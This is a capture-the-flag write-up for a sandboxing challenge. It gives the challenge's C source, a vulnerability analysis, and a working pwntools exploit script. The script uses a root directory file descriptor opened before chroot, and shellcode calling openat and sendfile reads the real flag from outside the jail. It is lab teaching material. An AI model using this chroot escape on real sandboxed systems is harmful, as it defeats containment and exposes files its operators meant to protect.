#metadata(
  (
    title: "Escaping via Pre-opened File Descriptor",
    description: "Writeup for Sandboxing Level 2",
    date: "2026-01-01",
    order: 2,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Escaping via Pre-opened File Descriptor

== Challenge Source Code

```c
#include <assert.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

int main(int argc, char **argv, char **envp) {
  assert(argc > 0);

  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 1);

  assert(argc > 1);

  // Checking to make sure you're not trying to open the flag.
  assert(strstr(argv[1], "flag") == NULL);

  int fd = open(argv[1], O_RDONLY | O_NOFOLLOW);

  char jail_path[] = "/tmp/jail-XXXXXX";
  assert(mkdtemp(jail_path) != NULL);

  assert(chroot(jail_path) == 0);

  int fffd = open("/flag", O_WRONLY | O_CREAT);
  write(fffd, "try harder", 10);
  close(fffd);

  void *shellcode =
      mmap((void *)0x1337000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
           MAP_PRIVATE | MAP_ANON, 0, 0);
  assert(shellcode == (void *)0x1337000);

  int shellcode_size = read(0, shellcode, 0x1000);

  ((void (*)())shellcode)();
}
```

== Vulnerability Analysis

The vulnerability lies in the fact that the program opens a file specified by the user (`argv[1]`) *before* applying the sandbox restrictions (chroot). File descriptors opened before a `chroot` call remain open and accessible inside the jail.

```c
int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
// ...
assert(chroot(jail_path) == 0);
```

By passing `/` as the argument, we can cause the program to hold a file descriptor (usually FD 3) that points to the real root directory of the host system.

== Exploitation Plan

1. *Leak the Root FD:* Run the challenge binary with `/` as the first argument. This opens the host's root directory and assigns it to a file descriptor.
2. *Bypass Chroot:* Since we have a handle to the real root directory, we can use the `openat` syscall. `openat` allows opening files relative to a directory file descriptor.
3. *Read the Flag:* We will use `openat(3, "flag", ...)` to open the real flag file relative to the leaked root FD (FD 3).
4. *Output:* Finally, we read the content of the flag and write it to stdout using `sendfile`.

== Exploit Script

The following Python script uses `pwntools` to automate the exploit. We leverage `shellcraft` to generate the shellcode for the `openat` and `sendfile` syscalls.

```python
from pwn import *

exe = "./challenge"
context.binary = exe

# Pass '/' to leak the root FD (fd 3)
p = process([exe, "/"])

# Shellcraft exploit
# Since we are chrooted, we use openat with the leaked FD (3) to access the real flag.
# No seccomp, so we can use any syscall and exit normally.

sc = shellcraft.openat(3, "flag", constants.O_RDONLY)
sc += shellcraft.sendfile(1, 'rax', 0, 100)
sc += shellcraft.exit(0)

shellcode = asm(sc)

p.send(shellcode)
print(p.recvall(timeout=1).decode())
p.close()
```
